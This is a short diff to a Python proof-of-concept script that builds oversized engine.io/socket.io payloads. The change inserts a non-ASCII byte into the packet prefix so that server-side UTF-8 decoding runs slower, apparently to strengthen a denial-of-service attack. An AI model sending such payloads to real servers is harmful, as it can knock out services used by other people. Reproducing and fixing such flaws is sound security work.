@@ -7,9 +7,11 @@ import requests
 def make_payload(total_length, data_length=2):
     # 4 means MESSAGE in engineio (data[0])
     # 2 means EVENT (non-binary) in socketio (data[1])
+    # But putting a character >0x80 in data
+    # slows down encoded_payload.decode('utf-8', errors='ignore') even more
     # data_length : data
     # e.g. '40:42["my event",{"data":"I\'m connected!"}]' * 20
-    prefix = '42'
+    prefix = '4\xbc'
     assert data_length >= len(prefix)
     packet = '%d:%s' % (data_length, prefix + 'x' * (data_length - len(prefix)))
     repetitions = total_length // len(packet)
